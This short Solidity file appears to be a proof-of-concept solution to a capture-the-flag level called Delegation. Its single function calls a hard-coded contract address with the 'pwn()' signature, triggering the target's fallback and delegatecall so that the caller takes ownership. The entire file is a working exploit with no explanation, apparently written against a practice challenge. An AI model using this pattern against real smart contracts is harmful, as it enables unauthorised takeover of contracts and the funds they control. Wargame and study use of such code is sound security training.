// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./delegation.sol";

contract DelegationPOC {
    function exploit() public {
        Delegation delegation = Delegation(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B);
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}   